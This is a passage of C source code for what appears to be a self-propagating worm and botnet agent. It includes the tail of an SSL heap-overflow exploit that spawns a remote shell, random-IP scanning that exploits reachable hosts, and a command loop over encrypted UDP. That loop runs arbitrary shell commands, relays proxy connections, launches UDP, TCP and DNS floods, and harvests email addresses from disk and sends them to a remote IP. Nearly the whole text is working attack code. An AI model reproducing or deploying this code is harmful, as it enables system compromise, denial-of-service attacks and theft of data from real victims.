  1726	
  1727		send_client_hello(ssl1);
  1728		get_server_hello(ssl1);
  1729		send_client_master_key(ssl1, overwrite_session_id_length, sizeof(overwrite_session_id_length)-1);
  1730		generate_session_keys(ssl1);
  1731		get_server_verify(ssl1);
  1732		send_client_finished(ssl1);
  1733		get_server_finished(ssl1);
  1734	
  1735		port = get_local_port(ssl2->sock);
  1736		overwrite_next_chunk[FINDSCKPORTOFS] = (char) (port & 0xff);
  1737		overwrite_next_chunk[FINDSCKPORTOFS+1] = (char) ((port >> 8) & 0xff);
  1738	
  1739		*(int*)&overwrite_next_chunk[156] = cipher;
  1740		*(int*)&overwrite_next_chunk[192] = architectures[arch].func_addr - 12;
  1741		*(int*)&overwrite_next_chunk[196] = ciphers + 16;
  1742	
  1743		send_client_hello(ssl2);
  1744		get_server_hello(ssl2);
  1745	
  1746		send_client_master_key(ssl2, overwrite_next_chunk, sizeof(overwrite_next_chunk)-1);
  1747		generate_session_keys(ssl2);
  1748		get_server_verify(ssl2);
  1749	
  1750		for (i = 0; i < ssl2->conn_id_length; i++) ssl2->conn_id[i] = (unsigned char) (rand() >> 24);
  1751	
  1752		send_client_finished(ssl2);
  1753		get_server_error(ssl2);
  1754	
  1755		sh(ssl2->sock);
  1756	
  1757		close(ssl2->sock);
  1758		close(ssl1->sock);
  1759	
  1760		exit(0);
  1761	}
  1762	#endif
  1763	
  1764	//////////////////////////////////////////////////////////////////////////////////////
  1765	//////////////////////////////////////////////////////////////////////////////////////
  1766	//////////////////////////////////////////////////////////////////////////////////////
  1767	
  1768	int main(int argc, char **argv) {
  1769		unsigned char a=0,b=0,c=0,d=0;
  1770		unsigned long bases,*cpbases;
  1771		struct initsrv_rec initrec;
  1772		int null=open("/dev/null",O_RDWR);
  1773		uptime=time(NULL);
  1774		if (argc <= 1) {
  1775			printf("%s: Exec format error. Binary file not executable.\n",argv[0]);
  1776			return 0;
  1777		}
  1778		srand(time(NULL)^getpid());
  1779		memset((char*)&routes,0,sizeof(struct route_table)*24);
  1780		memset(clients,0,sizeof(struct ainst)*CLIENTS*2);
  1781		if (audp_listen(&udpserver,PORT) != 0) {
  1782			printf("Error: %s\n",aerror(&udpserver));
  1783			return 0;
  1784		}
  1785		memset((void*)&initrec,0,sizeof(struct initsrv_rec));
  1786		initrec.h.tag=0x70;
  1787		initrec.h.len=0;
  1788		initrec.h.id=0;
  1789		cpbases=(unsigned long*)malloc(sizeof(unsigned long)*argc);
  1790		if (cpbases == NULL) {
  1791			printf("Insufficient memory\n");
  1792			return 0;
  1793		}
  1794		for (bases=1;bases<argc;bases++) {
  1795			cpbases[bases-1]=aresolve(argv[bases]);
  1796			relay(cpbases[bases-1],(char*)&initrec,sizeof(struct initsrv_rec));
  1797		}
  1798		numlinks=0;
  1799		dup2(null,0); dup2(null,1); dup2(null,2);
  1800		if (fork()) return 1;
  1801	// aion
  1802	        mailme(argv[1]); zhdr(0);
  1803		for(a=0;argv[0][a]!=0;a++) argv[0][a]=0;
  1804		for(a=0;argv[1][a]!=0;a++) argv[1][a]=0;
  1805		strcpy(argv[0],PSNAME); 
  1806	
  1807		a=classes[rand()%(sizeof classes)]; b=rand(); c=0; d=0;
  1808		signal(SIGCHLD,nas); signal(SIGHUP,nas);
  1809		while (1) {
  1810			static unsigned long timeout=0,timeout2=0,timeout3=0;
  1811			char buf_[3000],*buf=buf_;
  1812			int n=0,p=0;
  1813			long l=0,i=0;
  1814			unsigned long start=time(NULL);
  1815			fd_set read;
  1816			struct timeval tm;
  1817	
  1818			FD_ZERO(&read);
  1819			if (udpserver.sock > 0) FD_SET(udpserver.sock,&read);
  1820			udpserver.len=0;
  1821			l=udpserver.sock;
  1822			for (n=0;n<(CLIENTS*2);n++) if (clients[n].sock > 0) {
  1823				FD_SET(clients[n].sock,&read);
  1824				clients[n].len=0;
  1825				if (clients[n].sock > l) l=clients[n].sock;
  1826			}
  1827			memset((void*)&tm,0,sizeof(struct timeval));
  1828			tm.tv_sec=2;
  1829			tm.tv_usec=0;
  1830			l=select(l+1,&read,NULL,NULL,&tm);
  1831	
  1832			if (l == -1) {
  1833				if (errno == EINTR) {
  1834					for (i=0;i<numpids;i++) if (waitpid(pids[i],NULL,WNOHANG) > 0) {
  1835						unsigned int *newpids,on;
  1836						for (on=i+1;on<numpids;on++) pids[on-1]=pids[on];
  1837						pids[on-1]=0;
  1838						numpids--;
  1839						newpids=(unsigned int*)malloc((numpids+1)*sizeof(unsigned int));
  1840						if (newpids != NULL) {
  1841							for (on=0;on<numpids;on++) newpids[on]=pids[on];
  1842							FREE(pids);
  1843							pids=newpids;
  1844						}
  1845					}
  1846				}
  1847				continue;
  1848			}
  1849			timeout+=time(NULL)-start;
  1850			if (timeout >= 60) {
  1851				if (links == NULL || numlinks == 0) {
  1852					memset((void*)&initrec,0,sizeof(struct initsrv_rec));
  1853					initrec.h.tag=0x70;
  1854					initrec.h.len=0;
  1855					initrec.h.id=0;
  1856					for (i=0;i<bases;i++) relay(cpbases[i],(char*)&initrec,sizeof(struct initsrv_rec));
  1857				}
  1858				else if (!myip) {
  1859					memset((void*)&initrec,0,sizeof(struct initsrv_rec));
  1860					initrec.h.tag=0x74;
  1861					initrec.h.len=0;
  1862					initrec.h.id=0;
  1863					segment(2,(char*)&initrec,sizeof(struct initsrv_rec));
  1864				}
  1865				timeout=0;
  1866			}
  1867			timeout2+=time(NULL)-start;
  1868			if (timeout2 >= 3) {
  1869				struct mqueue *getqueue=queues;
  1870				while(getqueue != NULL) {
  1871					if (time(NULL)-getqueue->time > gettimeout()) {
  1872						struct mqueue *l=getqueue->next;
  1873						delqueue(getqueue->id);
  1874						delqueue(getqueue->id);
  1875						getqueue=l;
  1876						continue;
  1877					}
  1878					else if ((time(NULL)-getqueue->ltime) >= (getqueue->destination?6:3)) {
  1879						struct ainst ts;
  1880						char srv[256];
  1881						unsigned char i;
  1882						memset((void*)&ts,0,sizeof(struct ainst));
  1883						getqueue->ltime=time(NULL);
  1884						if (getqueue->destination) {
  1885							conv(srv,256,getqueue->destination);
  1886							audp_relay(&udpserver,&ts,srv,getqueue->port);
  1887							audp_send(&ts,getqueue->packet,getqueue->len);
  1888						}
  1889						else for (i=0;i<getqueue->trys;i++) segment(0,getqueue->packet,getqueue->len);
  1890					}
  1891					getqueue=getqueue->next;
  1892				}
  1893				timeout2=0;
  1894			}
  1895			timeout3+=time(NULL)-start;
  1896			if (timeout3 >= 60*10) {
  1897				char buf[2]={0,0};
  1898				syncmode(1);
  1899				broadcast(buf,1);
  1900				timeout3=0;
  1901			}
  1902	
  1903			if (udpserver.sock > 0 && FD_ISSET(udpserver.sock,&read)) udpserver.len=AREAD;
  1904	
  1905			for (n=0;n<(CLIENTS*2);n++) if (clients[n].sock > 0) if (FD_ISSET(clients[n].sock,&read)) clients[n].len=AREAD;
  1906	
  1907	#ifdef SCAN
  1908			if (myip) for (n=CLIENTS,p=0;n<(CLIENTS*2) && p<100;n++) if (clients[n].sock == 0) {
  1909				char srv[256];
  1910				if (d == 255) {
  1911					if (c == 255) {
  1912						a=classes[rand()%(sizeof classes)];
  1913						b=rand();
  1914						c=0;
  1915					}
  1916					else c++;
  1917					d=0;
  1918				}
  1919				else d++;
  1920				memset(srv,0,256);
  1921				sprintf(srv,"%d.%d.%d.%d",a,b,c,d);
  1922				clients[n].ext=time(NULL);
  1923				atcp_sync_connect(&clients[n],srv,SCANPORT);
  1924				p++;
  1925			}
  1926			for (n=CLIENTS;n<(CLIENTS*2);n++) if (clients[n].sock != 0) {
  1927				p=atcp_sync_check(&clients[n]);
  1928				if (p == ASUCCESS || p == ACONNECT || time(NULL)-((unsigned long)clients[n].ext) >= 5) atcp_close(&clients[n]);
  1929				if (p == ASUCCESS) {
  1930					char srv[256];
  1931					conv(srv,256,clients[n].in.sin_addr.s_addr);
  1932					if (mfork() == 0) {
  1933						exploit(srv);
  1934						exit(0);
  1935					}
  1936				}
  1937			}
  1938	#endif
  1939			for (n=0;n<CLIENTS;n++) if (clients[n].sock != 0) {
  1940				if (clients[n].ext2 == TCP_PENDING) {
  1941					struct add_rec rc;
  1942					memset((void*)&rc,0,sizeof(struct add_rec));
  1943					p=atcp_sync_check(&clients[n]);
  1944					if (p == ACONNECT) {
  1945						rc.h.tag=0x42;
  1946						rc.h.seq=newseq();
  1947						rc.h.id=clients[n].ext3;
  1948						relayclient(clients[n].ext,(void*)&rc,sizeof(struct add_rec));
  1949						FREE(clients[n].ext);
  1950						FREE(clients[n].ext5);
  1951						atcp_close(&clients[n]);
  1952					}
  1953					if (p == ASUCCESS) {
  1954						rc.h.tag=0x43;
  1955						rc.h.seq=newseq();
  1956						rc.h.id=clients[n].ext3;
  1957						relayclient(clients[n].ext,(void*)&rc,sizeof(struct add_rec));
  1958						clients[n].ext2=TCP_CONNECTED;
  1959						if (clients[n].ext5) {
  1960							atcp_send(&clients[n],clients[n].ext5,9);
  1961							clients[n].ext2=SOCKS_REPLY;
  1962						}
  1963					}
  1964				}
  1965				else if (clients[n].ext2 == SOCKS_REPLY && clients[n].len != 0) {
  1966					struct add_rec rc;
  1967					memset((void*)&rc,0,sizeof(struct add_rec));
  1968					l=atcp_recv(&clients[n],buf,3000);
  1969					if (*buf == 0) clients[n].ext2=TCP_CONNECTED;
  1970					else {
  1971						rc.h.tag=0x42;
  1972						rc.h.seq=newseq();
  1973						rc.h.id=clients[n].ext3;
  1974						relayclient(clients[n].ext,(void*)&rc,sizeof(struct add_rec));
  1975						FREE(clients[n].ext);
  1976						FREE(clients[n].ext5);
  1977						atcp_close(&clients[n]);
  1978					}
  1979				}
  1980				else if (clients[n].ext2 == TCP_CONNECTED && clients[n].len != 0) {
  1981					struct data_rec rc;
  1982					memset((void*)&rc,0,sizeof(struct data_rec));
  1983					l=atcp_recv(&clients[n],buf+sizeof(struct data_rec),3000-sizeof(struct data_rec));
  1984					if (l == AUNKNOWN) {
  1985						struct kill_rec rc;
  1986						memset((void*)&rc,0,sizeof(struct kill_rec));
  1987						rc.h.tag=0x42;
  1988						rc.h.seq=newseq();
  1989						rc.h.id=clients[n].ext3;
  1990						relayclient((struct ainst *)clients[n].ext,(void*)&rc,sizeof(struct kill_rec));
  1991						FREE(clients[n].ext);
  1992						FREE(clients[n].ext5);
  1993						atcp_close(&clients[n]);
  1994					}
  1995					else {
  1996						l=clients[n].len;
  1997						rc.h.tag=0x41;
  1998						rc.h.seq=newseq();
  1999						rc.h.id=clients[n].ext3;
  2000						rc.h.len=l;
  2001						_encrypt(buf+sizeof(struct data_rec),l);
  2002						memcpy(buf,(void*)&rc,sizeof(struct data_rec));
  2003						relayclient((struct ainst *)clients[n].ext,buf,l+sizeof(struct data_rec));
  2004					}
  2005				}
  2006			}
  2007	
  2008			if (udpserver.len != 0) if (!audp_recv(&udpserver,&udpclient,buf,3000)) {
  2009				struct llheader *llrp, ll;
  2010				struct header *tmp;
  2011				in++;
  2012				if (udpserver.len < 0 || udpserver.len < sizeof(struct llheader)) continue;
  2013				buf+=sizeof(struct llheader);
  2014				udpserver.len-=sizeof(struct llheader);
  2015				llrp=(struct llheader *)(buf-sizeof(struct llheader));
  2016				tmp=(struct header *)buf;
  2017				if (llrp->type == 0) {
  2018					memset((void*)&ll,0,sizeof(struct llheader));
  2019					if (llrp->checksum != in_cksum(buf,udpserver.len)) continue;
  2020					if (!usersa(llrp->id)) addrsa(llrp->id);
  2021					else continue;
  2022					ll.type=1;
  2023					ll.checksum=0;
  2024					ll.id=llrp->id;
  2025					if (tmp->tag != 0x26) audp_send(&udpclient,(char*)&ll,sizeof(struct llheader));
  2026				}
  2027				else if (llrp->type == 1) {
  2028					delqueue(llrp->id);
  2029					continue;
  2030				}
  2031				else continue;
  2032				if (udpserver.len >= sizeof(struct header)) {
  2033					switch(tmp->tag) {
  2034						case 0x20: { // Info
  2035							struct getinfo_rec *rp=(struct getinfo_rec *)buf;
  2036							struct info_rec rc;
  2037							if (udpserver.len < sizeof(struct getinfo_rec)) break;
  2038							memset((void*)&rc,0,sizeof(struct info_rec));
  2039							rc.h.tag=0x47;
  2040							rc.h.id=tmp->id;
  2041							rc.h.seq=newseq();
  2042							rc.h.len=0;
  2043	#ifdef SCAN
  2044							rc.a=a;
  2045							rc.b=b;
  2046							rc.c=c;
  2047							rc.d=d;
  2048	#endif
  2049							rc.ip=myip;
  2050							rc.uptime=time(NULL)-uptime;
  2051							rc.in=in;
  2052							rc.out=out;
  2053							rc.version=VERSION;
  2054							rc.reqtime=rp->time;
  2055							rc.reqmtime=rp->mtime;
  2056							relayclient(&udpclient,(char*)&rc,sizeof(struct info_rec));
  2057							} break;
  2058						case 0x21: { // Open a bounce
  2059							struct add_rec *sr=(struct add_rec *)buf;
  2060							if (udpserver.len < sizeof(struct add_rec)) break;
  2061							for (n=0;n<CLIENTS;n++) if (clients[n].sock == 0) {
  2062								char srv[256];
  2063								if (sr->socks == 0) conv(srv,256,sr->server);
  2064								else conv(srv,256,sr->socks);
  2065								clients[n].ext2=TCP_PENDING;
  2066								clients[n].ext3=sr->h.id;
  2067								clients[n].ext=(struct ainst*)malloc(sizeof(struct ainst));
  2068								if (clients[n].ext == NULL) {
  2069									clients[n].sock=0;
  2070									break;
  2071								}
  2072								memcpy((void*)clients[n].ext,(void*)&udpclient,sizeof(struct ainst));
  2073								if (sr->socks == 0) {
  2074									clients[n].ext5=NULL;
  2075									atcp_sync_connect(&clients[n],srv,sr->port);
  2076								}
  2077								else {
  2078									clients[n].ext5=(char*)malloc(9);
  2079									if (clients[n].ext5 == NULL) {
  2080										clients[n].sock=0;
  2081										break;
  2082									}
  2083									((char*)clients[n].ext5)[0]=0x04;
  2084									((char*)clients[n].ext5)[1]=0x01;
  2085									((char*)clients[n].ext5)[2]=((char*)&sr->port)[1];
  2086									((char*)clients[n].ext5)[3]=((char*)&sr->port)[0];
  2087									((char*)clients[n].ext5)[4]=((char*)&sr->server)[0];
  2088									((char*)clients[n].ext5)[5]=((char*)&sr->server)[1];
  2089									((char*)clients[n].ext5)[6]=((char*)&sr->server)[2];
  2090									((char*)clients[n].ext5)[7]=((char*)&sr->server)[3];
  2091									((char*)clients[n].ext5)[8]=0x00;
  2092									atcp_sync_connect(&clients[n],srv,1080);
  2093								}
  2094								if (sr->bind) abind(&clients[n],sr->bind,0);
  2095								break;
  2096							}
  2097							} break;
  2098						case 0x22: { // Close a bounce
  2099							struct kill_rec *sr=(struct kill_rec *)buf;
  2100							if (udpserver.len < sizeof(struct kill_rec)) break;
  2101							for (n=0;n<CLIENTS;n++) if (clients[n].ext3 == sr->h.id) {
  2102								FREE(clients[n].ext);
  2103								FREE(clients[n].ext5);
  2104								atcp_close(&clients[n]);
  2105							}
  2106							} break;
  2107						case 0x23: { // Send a message to a bounce
  2108							struct data_rec *sr=(struct data_rec *)buf;
  2109							if (udpserver.len < sizeof(struct data_rec)+sr->h.len) break;
  2110							for (n=0;n<CLIENTS;n++) if (clients[n].ext3 == sr->h.id) {
  2111								_decrypt(buf+sizeof(struct data_rec),sr->h.len);
  2112								atcp_send(&clients[n],buf+sizeof(struct data_rec),sr->h.len);
  2113							}
  2114							} break;
  2115	#ifndef LARGE_NET
  2116						case 0x24: { // Run a command
  2117							FILE *f;
  2118							struct sh_rec *sr=(struct sh_rec *)buf;
  2119							int id;
  2120							if (udpserver.len < sizeof(struct sh_rec)+sr->h.len || sr->h.len > 2999-sizeof(struct sh_rec)) break;
  2121							id=sr->h.id;
  2122							(buf+sizeof(struct sh_rec))[sr->h.len]=0;
  2123							_decrypt(buf+sizeof(struct sh_rec),sr->h.len);
  2124							f=popen(buf+sizeof(struct sh_rec),"r");
  2125							if (f != NULL) {
  2126								while(1) {
  2127									struct data_rec rc;
  2128									char *str;
  2129									unsigned long len;
  2130									memset(buf,0,3000);
  2131									fgets(buf,3000,f);
  2132									if (feof(f)) break;
  2133									len=strlen(buf);
  2134									memset((void*)&rc,0,sizeof(struct data_rec));
  2135									rc.h.tag=0x41;
  2136									rc.h.seq=newseq();
  2137									rc.h.id=id;
  2138									rc.h.len=len;
  2139									_encrypt(buf,len);
  2140									str=(char*)malloc(sizeof(struct data_rec)+len);
  2141									if (str == NULL) break;
  2142									memcpy((void*)str,(void*)&rc,sizeof(struct data_rec));
  2143									memcpy((void*)(str+sizeof(struct data_rec)),buf,len);
  2144									relayclient(&udpclient,str,sizeof(struct data_rec)+len);
  2145									FREE(str);
  2146								}
  2147								pclose(f);
  2148							}
  2149							else senderror(&udpclient,id,"Unable to execute command");
  2150							} break;
  2151	#endif
  2152						case 0x25: {
  2153							} break;
  2154						case 0x26: { // Route
  2155							struct route_rec *rp=(struct route_rec *)buf;
  2156							unsigned long i;
  2157							if (udpserver.len < sizeof(struct route_rec)) break;
  2158							if (!useseq(rp->h.seq)) {
  2159								addseq(rp->h.seq);
  2160								audp_send(&udpclient,(char*)&ll,sizeof(struct llheader));
  2161	
  2162								if (rp->sync == 1 && rp->links != numlinks) {
  2163									if (time(NULL)-synctime > 60) {
  2164										if (rp->links > numlinks) {
  2165											memset((void*)&initrec,0,sizeof(struct initsrv_rec));
  2166											initrec.h.tag=0x72;
  2167											initrec.h.len=0;
  2168											initrec.h.id=0;
  2169											relayclient(&udpclient,(char*)&initrec,sizeof(struct initsrv_rec));
  2170										}
  2171										else syncm(&udpclient,0x71,0);
  2172										synctime=time(NULL);
  2173									}
  2174								}
  2175								if (rp->sync != 3) {
  2176									rp->sync=1;
  2177									rp->links=numlinks;
  2178								}
  2179	
  2180								if (rp->server == -1 || rp->server == 0 || rp->server == myip) relay(inet_addr("127.0.0.1"),buf+sizeof(struct route_rec),rp->h.len-sizeof(struct route_rec));
  2181	
  2182								if (rp->server == -1 || rp->server == 0) segment(2,buf,rp->h.len);
  2183								else if (rp->server != myip) {
  2184									if (rp->hops == 0 || rp->hops > 16) relay(rp->server,buf,rp->h.len);
  2185									else {
  2186										rp->hops--;
  2187										segment(2,buf,rp->h.len);
  2188									}
  2189								}
  2190	
  2191								for (i=LINKS;i>0;i--) memcpy((struct route_table*)&routes[i],(struct route_table*)&routes[i-1],sizeof(struct route_table));
  2192								memset((struct route_table*)&routes[0],0,sizeof(struct route_table));
  2193								routes[0].id=rp->h.id;
  2194								routes[0].ip=udpclient.in.sin_addr.s_addr;
  2195								routes[0].port=htons(udpclient.in.sin_port);
  2196							}
  2197							} break;
  2198						case 0x27: {
  2199							} break;
  2200						case 0x28: { // List
  2201							struct list_rec *rp=(struct list_rec *)buf;
  2202							if (udpserver.len < sizeof(struct list_rec)) break;
  2203							syncm(&udpclient,0x46,rp->h.id);
  2204							} break;
  2205						case 0x29: { // Udp flood
  2206							int flag=1,fd,i=0;
  2207							char *str;
  2208							struct sockaddr_in in;
  2209							time_t start=time(NULL);
  2210							struct udp_rec *rp=(struct udp_rec *)buf;
  2211							if (udpserver.len < sizeof(struct udp_rec)) break;
  2212							if (rp->size > 9216) {
  2213								senderror(&udpclient,rp->h.id,"Size must be less than or equal to 9216\n");
  2214								break;
  2215							}
  2216							if (!isreal(rp->target)) {
  2217								senderror(&udpclient,rp->h.id,"Cannot packet local networks\n");
  2218								break;
  2219							}
  2220							if (waitforqueues()) break;
  2221							str=(char*)malloc(rp->size);
  2222							if (str == NULL) break;
  2223							for (i=0;i<rp->size;i++) str[i]=rand();
  2224							memset((void*)&in,0,sizeof(struct sockaddr_in));
  2225							in.sin_addr.s_addr=rp->target;
  2226							in.sin_family=AF_INET;
  2227							in.sin_port=htons(rp->port);
  2228							while(1) {
  2229								if (rp->port == 0) in.sin_port = rand();
  2230								if ((fd = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) < 0);
  2231								else {
  2232									flag = fcntl(fd, F_GETFL, 0);
  2233									flag |= O_NONBLOCK;
  2234									fcntl(fd, F_SETFL, flag);
  2235									sendto(fd,str,rp->size,0,(struct sockaddr*)&in,sizeof(in));
  2236									close(fd);
  2237								}
  2238								if (i >= 50) {
  2239									if (time(NULL) >= start+rp->secs) exit(0);
  2240									i=0;
  2241								}
  2242								i++;
  2243							}
  2244							FREE(str);
  2245							} exit(0);
  2246						case 0x2A: { // Tcp flood
  2247							int flag=1,fd,i=0;
  2248							struct sockaddr_in in;
  2249							time_t start=time(NULL);
  2250							struct tcp_rec *rp=(struct tcp_rec *)buf;
  2251							if (udpserver.len < sizeof(struct tcp_rec)) break;
  2252							if (!isreal(rp->target)) {
  2253								senderror(&udpclient,rp->h.id,"Cannot packet local networks\n");
  2254								break;
  2255							}
  2256							if (waitforqueues()) break;
  2257							memset((void*)&in,0,sizeof(struct sockaddr_in));
  2258							in.sin_addr.s_addr=rp->target;
  2259							in.sin_family=AF_INET;
  2260							in.sin_port=htons(rp->port);
  2261							while(1) {
  2262								if (rp->port == 0) in.sin_port = rand();
  2263								if ((fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0);
  2264								else {
  2265									flag = fcntl(fd, F_GETFL, 0);
  2266									flag |= O_NONBLOCK;
  2267									fcntl(fd, F_SETFL, flag);
  2268									connect(fd, (struct sockaddr *)&in, sizeof(in));
  2269									close(fd);
  2270								}
  2271								if (i >= 50) {
  2272									if (time(NULL) >= start+rp->secs) exit(0);
  2273									i=0;
  2274								}
  2275								i++;
  2276							}
  2277							} exit(0);
  2278	#ifndef NOIPV6
  2279						case 0x2B: { // IPv6 Tcp flood
  2280							int flag=1,fd,i=0,j=0;
  2281							struct sockaddr_in6 in;
  2282							time_t start=time(NULL);
  2283							struct tcp6_rec *rp=(struct tcp6_rec *)buf;
  2284							if (udpserver.len < sizeof(struct tcp6_rec)) break;
  2285							if (waitforqueues()) break;
  2286							memset((void*)&in,0,sizeof(struct sockaddr_in6));
  2287							for (i=0;i<4;i++) for (j=0;j<4;j++) ((char*)&in.sin6_addr.s6_addr[i])[j]=((char*)&rp->target[i])[j];
  2288							in.sin6_family=AF_INET6;
  2289							in.sin6_port=htons(rp->port);
  2290							while(1) {
  2291								if (rp->port == 0) in.sin6_port = rand();
  2292								if ((fd = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP)) < 0);
  2293								else {
  2294									flag = fcntl(fd, F_GETFL, 0);
  2295									flag |= O_NONBLOCK;
  2296									fcntl(fd, F_SETFL, flag);
  2297									connect(fd, (struct sockaddr *)&in, sizeof(in));
  2298									close(fd);
  2299								}
  2300								if (i >= 50) {
  2301									if (time(NULL) >= start+rp->secs) exit(0);
  2302									i=0;
  2303								}
  2304								i++;
  2305							}
  2306							} exit(0);
  2307	#endif
  2308						case 0x2C: { // Dns flood
  2309							struct dns {
  2310								unsigned short int id;
  2311								unsigned char  rd:1;
  2312								unsigned char  tc:1;
  2313								unsigned char  aa:1;
  2314								unsigned char  opcode:4;
  2315								unsigned char  qr:1;
  2316								unsigned char  rcode:4;
  2317								unsigned char  unused:2;
  2318								unsigned char  pr:1;
  2319								unsigned char  ra:1;
  2320								unsigned short int que_num;
  2321								unsigned short int rep_num;
  2322								unsigned short int num_rr;
  2323								unsigned short int num_rrsup;
  2324								char buf[128];
  2325							} dnsp;
  2326							unsigned long len=0,i=0,startm;
  2327							int fd,flag;
  2328							char *convo;
  2329							struct sockaddr_in in;
  2330							struct df_rec *rp=(struct df_rec *)buf;
  2331							time_t start=time(NULL);
  2332							if (udpserver.len < sizeof(struct df_rec)+rp->h.len || rp->h.len > 2999-sizeof(struct df_rec)) break;
  2333							if (!isreal(rp->target)) {
  2334								senderror(&udpclient,rp->h.id,"Cannot packet local networks\n");
  2335								break;
  2336							}
  2337							if (waitforqueues()) break;
  2338							memset((void*)&in,0,sizeof(struct sockaddr_in));
  2339							in.sin_addr.s_addr=rp->target;
  2340							in.sin_family=AF_INET;
  2341							in.sin_port=htons(53);
  2342							dnsp.rd=1;
  2343							dnsp.tc=0;
  2344							dnsp.aa=0;
  2345							dnsp.opcode=0;
  2346							dnsp.qr=0;
  2347							dnsp.rcode=0;
  2348							dnsp.unused=0;
  2349							dnsp.pr=0;
  2350							dnsp.ra=0;
  2351							dnsp.que_num=256;
  2352							dnsp.rep_num=0;
  2353							dnsp.num_rr=0;
  2354							dnsp.num_rrsup=0;
  2355							convo=buf+sizeof(struct df_rec);
  2356							convo[rp->h.len]=0;
  2357							_decrypt(convo,rp->h.len);
  2358							for (i=0,startm=0;i<=rp->h.len;i++) if (convo[i] == '.' || convo[i] == 0) {
  2359								convo[i]=0;
  2360								sprintf(dnsp.buf+len,"%c%s",(unsigned char)(i-startm),convo+startm);
  2361								len+=1+strlen(convo+startm);
  2362								startm=i+1;
  2363							}
  2364							dnsp.buf[len++]=0;
  2365							dnsp.buf[len++]=0;
  2366							dnsp.buf[len++]=1;
  2367							dnsp.buf[len++]=0;
  2368							dnsp.buf[len++]=1;
  2369							while(1) {
  2370								dnsp.id=rand();
  2371								if ((fd = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) < 0);
  2372								else {
  2373									flag = fcntl(fd, F_GETFL, 0);
  2374									flag |= O_NONBLOCK;
  2375									fcntl(fd, F_SETFL, flag);
  2376									sendto(fd,(char*)&dnsp,sizeof(struct dns)+len-128,0,(struct sockaddr*)&in,sizeof(in));
  2377									close(fd);
  2378								}
  2379								if (i >= 50) {
  2380									if (time(NULL) >= start+rp->secs) exit(0);
  2381									i=0;
  2382								}
  2383								i++;
  2384							}
  2385							} exit(0);
  2386						case 0x2D: { // Email scan
  2387							char ip[256];
  2388							struct escan_rec *rp=(struct escan_rec *)buf;
  2389							if (udpserver.len < sizeof(struct escan_rec)) break;
  2390							if (!isreal(rp->ip)) {
  2391								senderror(&udpclient,rp->h.id,"Invalid IP\n");
  2392								break;
  2393							}
  2394							conv(ip,256,rp->ip);
  2395							if (mfork() == 0) {
  2396								struct _linklist *getb;
  2397								struct ainst client;
  2398								StartScan("/");
  2399								audp_setup(&client,(char*)ip,ESCANPORT);
  2400								getb=linklist;
  2401								while(getb != NULL) {
  2402									unsigned long len=strlen(getb->name);
  2403									audp_send(&client,getb->name,len);
  2404									getb=getb->next;
  2405								}
  2406								audp_close(&client);
  2407								exit(0);
  2408							}
  2409							} break;
  2410						case 0x70: { // Incomming client
  2411							struct {
  2412								struct addsrv_rec a;
  2413								unsigned long server;
  2414							} rc;
  2415							struct myip_rec rp;
  2416							if (!isreal(udpclient.in.sin_addr.s_addr)) break;
  2417	
  2418							syncmode(3);
  2419							memset((void*)&rp,0,sizeof(struct myip_rec));
  2420							rp.h.tag=0x73;
  2421							rp.h.id=0;
  2422							rp.ip=udpclient.in.sin_addr.s_addr;
  2423							relayclient(&udpclient,(void*)&rp,sizeof(struct myip_rec));
  2424	
  2425							memset((void*)&rc,0,sizeof(rc));
  2426							rc.a.h.tag=0x71;
  2427							rc.a.h.id=0;
  2428							rc.a.h.len=sizeof(unsigned long);
  2429							rc.server=udpclient.in.sin_addr.s_addr;
  2430							broadcast((void*)&rc,sizeof(rc));
  2431							syncmode(1);
  2432	
  2433							addserver(rc.server);
  2434							syncm(&udpclient,0x71,0);
  2435							} break;
  2436						case 0x71: { // Receive the list
  2437							struct addsrv_rec *rp=(struct addsrv_rec *)buf;
  2438							struct next_rec { unsigned long server; };
  2439							unsigned long a;
  2440							char b=0;
  2441							if (udpserver.len < sizeof(struct addsrv_rec)) break;
  2442							for (a=0;rp->h.len > a*sizeof(struct next_rec) && udpserver.len > sizeof(struct addsrv_rec)+(a*sizeof(struct next_rec));a++) {
  2443								struct next_rec *fc=(struct next_rec*)(buf+sizeof(struct addsrv_rec)+(a*sizeof(struct next_rec)));
  2444								addserver(fc->server);
  2445							}
  2446							for (a=0;a<numlinks;a++) if (links[a] == udpclient.in.sin_addr.s_addr) b=1;
  2447							if (!b && isreal(udpclient.in.sin_addr.s_addr)) {
  2448								struct myip_rec rp;
  2449								memset((void*)&rp,0,sizeof(struct myip_rec));
  2450								rp.h.tag=0x73;
  2451								rp.h.id=0;
  2452								rp.ip=udpclient.in.sin_addr.s_addr;
  2453								relayclient(&udpclient,(void*)&rp,sizeof(struct myip_rec));
  2454								addserver(udpclient.in.sin_addr.s_addr);
  2455							}
  2456							} break;
  2457						case 0x72: { // Send the list
  2458							syncm(&udpclient,0x71,0);
  2459							} break;
  2460						case 0x73: { // Get my IP
  2461							struct myip_rec *rp=(struct myip_rec *)buf;
  2462							if (udpserver.len < sizeof(struct myip_rec)) break;
  2463							if (!myip && isreal(rp->ip)) {
  2464								myip=rp->ip;
  2465								addserver(rp->ip);
  2466							}
  2467							} break;
  2468						case 0x74: { // Transmit their IP
  2469							struct myip_rec rc;
  2470							memset((void*)&rc,0,sizeof(struct myip_rec));
  2471							rc.h.tag=0x73;
  2472							rc.h.id=0;
  2473							rc.ip=udpclient.in.sin_addr.s_addr;
  2474							if (!isreal(rc.ip)) break;
  2475							relayclient(&udpclient,(void*)&rc,sizeof(struct myip_rec));
  2476							} break;
  2477						case 0x41:   //  --|
  2478						case 0x42:   //    |
  2479						case 0x43:   //    |
  2480						case 0x44:   //    |---> Relay to client
  2481						case 0x45:   //    |
  2482						case 0x46:   //    |
  2483						case 0x47: { //  --|
  2484							unsigned long a;
  2485							struct header *rc=(struct header *)buf;
  2486							if (udpserver.len < sizeof(struct header)) break;
  2487							if (!useseq(rc->seq)) {
  2488								addseq(rc->seq);
  2489								for (a=0;a<LINKS;a++) if (routes[a].id == rc->id) {
  2490									struct ainst ts;
  2491									char srv[256];
  2492									conv(srv,256,routes[a].ip);
  2493									audp_relay(&udpserver,&ts,srv,routes[a].port);
  2494									relayclient(&ts,buf,udpserver.len);
  2495									break;
  2496								}
  2497							}
  2498							} break;
  2499					}
  2500				}
  2501			}
  2502		}
  2503		audp_close(&udpserver);
  2504		return 0;
  2505	}
